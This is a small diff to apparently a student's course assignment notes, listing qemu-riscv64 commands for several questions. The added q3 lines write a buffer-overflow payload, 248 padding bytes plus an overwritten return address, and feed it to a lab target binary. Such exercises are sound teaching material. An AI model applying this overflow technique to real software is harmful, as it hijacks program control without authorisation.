@@ -8,6 +8,9 @@ q2:
       qemu-riscv64 ./q2  85 96 70 80 102
 q3:
     a: qemu-riscv64 ./target_akshara3101 < payload.txt
+    b:
+         qemu-riscv64 ./target_akshara3101 < payload
+         python3 -c "import sys; sys.stdout.buffer.write(b'A'*248 + (0x104e8).to_bytes(8,'little'))" > payload
 q4: gcc -shared -fPIC -o libfun.so fun.c 
     gcc -o q4 q4.c -ldl
     ./q4        
